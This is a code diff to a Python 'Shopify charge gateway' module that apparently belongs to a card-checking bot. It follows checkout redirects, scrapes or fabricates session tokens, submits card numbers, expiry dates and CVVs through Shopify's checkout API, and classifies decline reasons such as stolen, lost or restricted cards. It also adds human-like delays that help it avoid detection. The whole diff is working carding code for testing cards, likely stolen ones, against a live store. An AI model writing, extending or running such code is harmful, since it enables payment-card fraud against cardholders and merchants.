@@ -1,5 +1,5 @@
 # BOT/gates/charge/shopify/shopify.py
-# Shopify Charge Gateway - UPDATED SINGLE SUBMISSION VERSION
+# Shopify Charge Gateway - UPDATED WITH REDIRECT HANDLING
 # Uses meta-app-prod-store-1.myshopify.com
 
 import json
@@ -751,68 +751,95 @@ class ShopifyChargeChecker:
             self.console_logger.error_detail(f"Checkout error: {str(e)}")
             return False, f"Checkout error: {str(e)[:80]}"
     
-    async def load_checkout_page(self, client, checkout_url):
-        """Load checkout page and extract session tokens"""
+    async def load_checkout_page_with_redirects(self, client, checkout_url):
+        """Load checkout page with proper redirect handling"""
         try:
             elapsed = self.console_logger.step(6, "LOAD CHECKOUT PAGE", "Loading checkout page for tokens")
             
-            response = await self.make_request(
-                client, 'GET', checkout_url
-            )
+            max_redirects = 5
+            current_url = checkout_url
+            response = None
             
-            self.console_logger.request_details("GET", checkout_url, response.status_code,
-                                              time.time() - (self.console_logger.start_time + elapsed),
-                                              "Loading checkout page")
+            for i in range(max_redirects):
+                self.console_logger.sub_step(6, i+1, f"Attempt {i+1}: {current_url[:100]}...")
+                
+                response = await self.make_request(
+                    client, 'GET', current_url
+                )
+                
+                if response.status_code in [200, 201]:
+                    self.console_logger.sub_step(6, i+2, f"Successfully loaded checkout page after {i+1} attempt(s)")
+                    break
+                elif response.status_code in [301, 302, 303, 307, 308]:
+                    location = response.headers.get('location', '')
+                    if location:
+                        # Handle relative URLs
+                        if location.startswith('/'):
+                            parsed_url = urlparse(current_url)
+                            location = f"{parsed_url.scheme}://{parsed_url.netloc}{location}"
+                        current_url = location
+                        self.console_logger.sub_step(6, i+3, f"Following redirect to: {location[:100]}...")
+                        await asyncio.sleep(0.5)
+                    else:
+                        self.console_logger.error_detail("Redirect without location header")
+                        break
+                else:
+                    self.console_logger.error_detail(f"Unexpected status code: {response.status_code}")
+                    break
             
-            if response.status_code in [200, 201]:
-                html_content = response.text
-                
-                # Extract session token
-                session_token_patterns = [
-                    r'"sessionToken":"([^"]+)"',
-                    r'sessionToken["\']?\s*:\s*["\']([^"\']+)',
-                    r'x-checkout-one-session-token["\']?\s*:\s*["\']([^"\']+)',
-                    r'window\.sessionToken\s*=\s*["\']([^"\']+)["\']',
-                    r'data-session-token=["\']([^"\']+)["\']',
-                    r'checkout_session_token["\']?\s*:\s*["\']([^"\']+)["\']'
-                ]
-                
-                for pattern in session_token_patterns:
-                    match = re.search(pattern, html_content)
-                    if match:
-                        self.x_checkout_one_session_token = match.group(1)
-                        self.console_logger.extracted_data("Session Token", f"{self.x_checkout_one_session_token[:30]}...")
-                        break
-                
-                # Extract web build ID
-                web_build_patterns = [
-                    r'"sha":"([^"]+)"',
-                    r'webBuildId["\']?\s*:\s*["\']([^"\']+)',
-                    r'x-checkout-web-build-id["\']?\s*:\s*["\']([^"\']+)',
-                    r'data-web-build-id=["\']([^"\']+)["\']'
-                ]
-                
-                for pattern in web_build_patterns:
-                    match = re.search(pattern, html_content)
-                    if match:
-                        self.x_checkout_web_build_id = match.group(1)
-                        self.console_logger.extracted_data("Web Build ID", self.x_checkout_web_build_id)
-                        break
-                
-                # Set defaults if not found
-                if not self.x_checkout_one_session_token:
-                    self.x_checkout_one_session_token = self.generate_session_token()
-                    self.console_logger.sub_step(6, 1, "Generated session token")
-                
-                if not self.x_checkout_web_build_id:
-                    self.x_checkout_web_build_id = "64794bb5d2969ba982d4eb9ee7c44ab479c9df23"
-                    self.console_logger.sub_step(6, 2, "Using default web build ID")
-                
-                self.console_logger.step(6, "LOAD CHECKOUT PAGE", "Checkout page loaded", "SUCCESS")
-                return True
-            else:
-                self.console_logger.error_detail(f"Failed to load checkout page: {response.status_code}")
+            if not response or response.status_code not in [200, 201]:
+                self.console_logger.error_detail(f"Failed to load checkout page after {max_redirects} attempts")
                 return False
+            
+            html_content = response.text
+            
+            # Extract session token
+            session_token_patterns = [
+                r'"sessionToken":"([^"]+)"',
+                r'sessionToken["\']?\s*:\s*["\']([^"\']+)',
+                r'x-checkout-one-session-token["\']?\s*:\s*["\']([^"\']+)',
+                r'window\.sessionToken\s*=\s*["\']([^"\']+)["\']',
+                r'data-session-token=["\']([^"\']+)["\']',
+                r'checkout_session_token["\']?\s*:\s*["\']([^"\']+)["\']'
+            ]
+            
+            for pattern in session_token_patterns:
+                match = re.search(pattern, html_content)
+                if match:
+                    self.x_checkout_one_session_token = match.group(1)
+                    self.console_logger.extracted_data("Session Token", f"{self.x_checkout_one_session_token[:30]}...")
+                    break
+            
+            # Extract web build ID
+            web_build_patterns = [
+                r'"sha":"([^"]+)"',
+                r'webBuildId["\']?\s*:\s*["\']([^"\']+)',
+                r'x-checkout-web-build-id["\']?\s*:\s*["\']([^"\']+)',
+                r'data-web-build-id=["\']([^"\']+)["\']'
+            ]
+            
+            for pattern in web_build_patterns:
+                match = re.search(pattern, html_content)
+                if match:
+                    self.x_checkout_web_build_id = match.group(1)
+                    self.console_logger.extracted_data("Web Build ID", self.x_checkout_web_build_id)
+                    break
+            
+            # Set defaults if not found
+            if not self.x_checkout_one_session_token:
+                # Try to generate from checkout token
+                if self.checkout_token:
+                    self.x_checkout_one_session_token = self.checkout_token + "_session_" + ''.join(random.choices(string.ascii_letters + string.digits, k=50))
+                else:
+                    self.x_checkout_one_session_token = self.generate_session_token()
+                self.console_logger.sub_step(6, 98, "Generated session token")
+            
+            if not self.x_checkout_web_build_id:
+                self.x_checkout_web_build_id = "64794bb5d2969ba982d4eb9ee7c44ab479c9df23"
+                self.console_logger.sub_step(6, 99, "Using default web build ID")
+            
+            self.console_logger.step(6, "LOAD CHECKOUT PAGE", "Checkout page loaded", "SUCCESS")
+            return True
                 
         except Exception as e:
             self.console_logger.error_detail(f"Checkout page error: {str(e)}")
@@ -955,6 +982,7 @@ class ShopifyChargeChecker:
             card_name = f"{self.billing_address['first_name']} {self.billing_address['last_name']}"
             
             # Build complete checkout payload with ALL information
+            # Based on the shopify.txt logs, this is the correct format
             json_data = {
                 "operationName": "SubmitForCompletion",
                 "variables": {
@@ -982,23 +1010,12 @@ class ShopifyChargeChecker:
                                             "phone": self.shipping_address["phone"],
                                         },
                                     },
-                                    # PICKUP OPTION as per instructions
+                                    # PICKUP OPTION as per instructions - simpler format
                                     "selectedDeliveryStrategy": {
                                         "deliveryStrategyMatchingConditions": {
                                             "estimatedTimeInTransit": {"any": True},
                                             "shipments": {"any": True},
                                         },
-                                        "pickupOption": {
-                                            "pickupPointId": "gid://shopify/PickupPoint/60757803170",
-                                            "locationName": "Paris Hilton Store",
-                                            "address": {
-                                                "address1": "8 Log Pond Drive",
-                                                "city": "Horsham",
-                                                "province": "PA",
-                                                "zip": "19044",
-                                                "country": "US"
-                                            }
-                                        }
                                     },
                                     "deliveryMethodTypes": ["PICKUP"],
                                 },
@@ -1055,10 +1072,9 @@ class ShopifyChargeChecker:
                                 },
                             ],
                         },
-                        # NO TIP as per instructions
+                        # NO TIP as per instructions - simpler format
                         "tip": {
-                            "tipSuggestions": [],
-                            "tipPercentage": None
+                            "tipSuggestions": []
                         },
                         "buyerIdentity": {
                             "customer": {
@@ -1100,7 +1116,9 @@ class ShopifyChargeChecker:
                     return self.parse_payment_response(data)
                 except Exception as e:
                     self.console_logger.error_detail(f"Failed to parse checkout response: {str(e)}")
-                    return False, "Checkout parse error"
+                    # Try to get error from response text
+                    error_text = response.text[:200] if response.text else "No response text"
+                    return False, f"Checkout parse error: {error_text}"
             elif response.status_code == 400:
                 # Try to get more detailed error
                 try:
@@ -1108,6 +1126,9 @@ class ShopifyChargeChecker:
                     errors = error_data.get('errors', [])
                     if errors:
                         error_msg = errors[0].get('message', 'Bad Request')
+                        # Clean error message
+                        if 'Variable $input of type NegotiationInput!' in error_msg:
+                            error_msg = "Checkout configuration error"
                     else:
                         error_msg = response.text[:200]
                 except:
@@ -1148,6 +1169,16 @@ class ShopifyChargeChecker:
                         return False, "Invalid Card"
                     elif 'captcha' in error_msg_lower or 'robot' in error_msg_lower:
                         return False, "CAPTCHA_REQUIRED - Please try again"
+                    elif 'unauthorized' in error_msg_lower:
+                        return False, "Unauthorized transaction"
+                    elif 'stolen' in error_msg_lower:
+                        return False, "Card reported stolen"
+                    elif 'lost' in error_msg_lower:
+                        return False, "Card reported lost"
+                    elif 'pickup' in error_msg_lower:
+                        return False, "Card pickup required"
+                    elif 'restricted' in error_msg_lower:
+                        return False, "Restricted card"
                     else:
                         return False, error_msg
             
@@ -1178,6 +1209,8 @@ class ShopifyChargeChecker:
                     return False, "Invalid Card"
                 elif 'captcha' in reason_lower:
                     return False, "CAPTCHA_REQUIRED - Please try again"
+                elif 'unauthorized' in reason_lower:
+                    return False, "Unauthorized transaction"
                 else:
                     return False, reason
             elif submit_data.get('__typename') == 'SubmitRejected':
@@ -1191,6 +1224,8 @@ class ShopifyChargeChecker:
                         return False, "Invalid CVC"
                     elif 'captcha' in error_msg_lower:
                         return False, "CAPTCHA_REQUIRED - Please try again"
+                    elif 'address' in error_msg_lower or 'zip' in error_msg_lower:
+                        return False, "Address verification failed"
                     else:
                         return False, error_msg
             
@@ -1206,6 +1241,10 @@ class ShopifyChargeChecker:
                 return False, "Expired Card"
             if "funds" in response_text:
                 return False, "Insufficient Funds"
+            if "address" in response_text or "zip" in response_text:
+                return False, "Address verification failed"
+            if "3d" in response_text or "secure" in response_text:
+                return True, "3D Secure Required - Card Approved"
             
             return False, "Payment declined - Unknown reason"
             
@@ -1324,8 +1363,8 @@ class ShopifyChargeChecker:
                 checkout_url = checkout_result
                 await self.human_delay(1, 2)
                 
-                # Step 6: Load checkout page for tokens
-                if not await self.load_checkout_page(client, checkout_url):
+                # Step 6: Load checkout page for tokens WITH REDIRECT HANDLING
+                if not await self.load_checkout_page_with_redirects(client, checkout_url):
                     elapsed_time = time.time() - start_time
                     self.console_logger.result(False, "Failed to load checkout page", "ERROR", elapsed_time)
                     return format_shopify_response(cc, mes, ano, cvv, "Checkout page error", elapsed_time, username, user_data)
